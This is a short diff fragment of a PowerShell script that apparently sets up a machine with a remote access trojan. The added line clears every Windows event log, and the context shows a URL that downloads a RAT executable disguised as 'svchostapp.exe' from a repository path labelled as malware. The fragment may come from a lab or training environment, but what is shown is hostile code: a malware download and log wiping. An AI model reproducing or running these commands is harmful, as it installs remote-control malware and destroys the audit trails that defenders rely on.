@@ -14,6 +14,8 @@ param(
 #   Condition the following functions: Domain add, Computer rename, PSCredential creation, RAT addons, Evaluation rearm
 #
 ###
+Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+
 
 # Static URLs to download RAT and static download locat
 $raturl = "https://github.com/cybermias/publicrep/raw/master/malware/dangerzone/svchostapp.exe"
